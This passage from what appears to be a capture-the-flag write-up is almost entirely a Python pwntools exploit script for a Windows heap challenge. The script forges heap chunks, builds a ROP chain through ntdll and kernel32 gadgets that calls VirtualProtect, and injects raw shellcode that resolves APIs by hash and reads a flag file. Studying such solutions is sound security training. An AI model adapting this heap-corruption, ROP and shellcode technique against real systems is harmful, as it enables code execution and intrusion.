payload += p32(<span class="hljs-number">0x4C0</span> | (<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">0xd</span>))
payload += p64(<span class="hljs-number">0</span>)
payload += p64(<span class="hljs-number">0x1000</span>)
payload += p64(<span class="hljs-number">0</span>)
payload += <span class="hljs-string">'\xff'</span> * <span class="hljs-number">12</span> + <span class="hljs-string">'\x00'</span> * <span class="hljs-number">0x14</span>
payload += p64(<span class="hljs-number">0xfa0</span>)

create(<span class="hljs-string">'f'</span>, payload, <span class="hljs-number">0x270</span>)
payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">0x10</span>
payload += p64(heap &amp; <span class="hljs-number">0xfffffffffffff000</span>)
payload += <span class="hljs-string">'a'</span> * <span class="hljs-number">0x20</span>
payload += p64(fake + <span class="hljs-number">0x10</span>)
create(<span class="hljs-string">'g'</span>, payload, <span class="hljs-number">0x270</span>)
logout()
p.sendlineafter(<span class="hljs-string">'&gt;&gt;'</span>, <span class="hljs-string">'1'</span>)
p.sendlineafter(<span class="hljs-string">':'</span>, <span class="hljs-string">'orange'</span>)

p.sendlineafter(<span class="hljs-string">':'</span>, <span class="hljs-string">'godlike'</span>)
payload = <span class="hljs-string">'a'</span> * ((target_stack &amp; <span class="hljs-number">0xfff</span>) - <span class="hljs-number">0x6a0</span>)

addrsp = base + <span class="hljs-number">0x01d0b</span>
virtual_protect = kernel32 + <span class="hljs-number">0x1B680</span>
poprcx = ntdll + <span class="hljs-number">0x9217b</span>
poprdx = ntdll + <span class="hljs-number">0x57642</span>
popr8 = ntdll + <span class="hljs-number">0x2010b</span>
poprax = ntdll + <span class="hljs-number">0x2010c</span>
popr9_jmp = ntdll + <span class="hljs-number">0x08fb15</span>

payload += p64(addrsp)
payload += <span class="hljs-string">'a'</span> * <span class="hljs-number">0x28</span>
payload += p64(base + <span class="hljs-number">0x1fcc</span>)
payload += <span class="hljs-string">'x'</span> * <span class="hljs-number">0x38</span>
payload += p64(poprax)
payload += p64(virtual_protect)
payload += p64(poprcx)
payload += p64(stack)
payload += p64(poprdx)
payload += p64(<span class="hljs-number">0x1000</span>)
payload += p64(popr8)
payload += p64(<span class="hljs-number">0x40</span>)
payload += p64(popr9_jmp)
payload += p64(base + <span class="hljs-number">0x5630</span>)
payload += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span>
payload += p64(stack + len(payload) + <span class="hljs-number">0x20</span>)
payload += <span class="hljs-string">'\x90'</span> * <span class="hljs-number">0x100</span>

buf = [
    <span class="hljs-number">0x40</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x00</span>,
    <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xAC</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x8B</span>,
    <span class="hljs-number">0x41</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0xCF</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,
    <span class="hljs-number">0x48</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0xB7</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x66</span>,
    <span class="hljs-number">0x85</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0xB7</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0xC2</span>,
    <span class="hljs-number">0x0F</span>, <span class="hljs-number">0xB7</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0xDB</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x74</span>,
    <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x49</span>,
    <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,
    <span class="hljs-number">0x00</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0xCF</span>,
    <span class="hljs-number">0x48</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0xB7</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x66</span>,
    <span class="hljs-number">0x85</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0xB7</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0xCA</span>,
    <span class="hljs-number">0x0F</span>, <span class="hljs-number">0xB7</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x22</span>,
    <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,
    <span class="hljs-number">0x00</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0xAC</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,
    <span class="hljs-number">0x5F</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x68</span>,
    <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xB4</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x48</span>,
    <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xB4</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,
    <span class="hljs-number">0xBA</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,
    <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,
    <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0xF0</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,
    <span class="hljs-number">0xBA</span>, <span class="hljs-number">0xB0</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0xF0</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,
    <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x00</span>,
    <span class="hljs-number">0x00</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x8B</span>,
    <span class="hljs-number">0xF8</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0xF3</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0xCA</span>,
    <span class="hljs-number">0x45</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,
    <span class="hljs-number">0x41</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x41</span>,
    <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x66</span>,
    <span class="hljs-number">0x41</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xD3</span>,
    <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x00</span>,
    <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xFF</span>,
    <span class="hljs-number">0xD6</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0xF5</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>,
    <span class="hljs-number">0x00</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0x48</span>,
    <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xD5</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0xB4</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x01</span>,
    <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0xB4</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x01</span>,
    <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0xAC</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0x50</span>,
    <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0xCC</span>,
    <span class="hljs-number">0x0F</span>, <span class="hljs-number">0xB6</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x90</span>,
    <span class="hljs-number">0x6B</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0xB6</span>, <span class="hljs-number">0x14</span>,
    <span class="hljs-number">0x08</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0xCC</span>,
    <span class="hljs-number">0x40</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0x8B</span>,
    <span class="hljs-number">0x8C</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0x20</span>,
    <span class="hljs-number">0x5F</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x30</span>,
    <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x40</span>,
    <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0xD3</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0xF3</span>, <span class="hljs-number">0x85</span>,
    <span class="hljs-number">0xDB</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0xCB</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0xC7</span>,
    <span class="hljs-number">0x74</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0xCB</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0xC0</span>,
    <span class="hljs-number">0x48</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x48</span>,
    <span class="hljs-number">0x83</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0xB7</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x03</span>,
    <span class="hljs-number">0xC3</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0xDD</span>
]
buf = <span class="hljs-string">''</span>.join([chr(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> buf])
payload += buf

p.send(payload)
p.interactive()</code></pre><h3 id="one-punch-man-[292pts]"><a class="header-link" href="#one-punch-man-[292pts]"></a>One Punch Man [292pts]</h3>
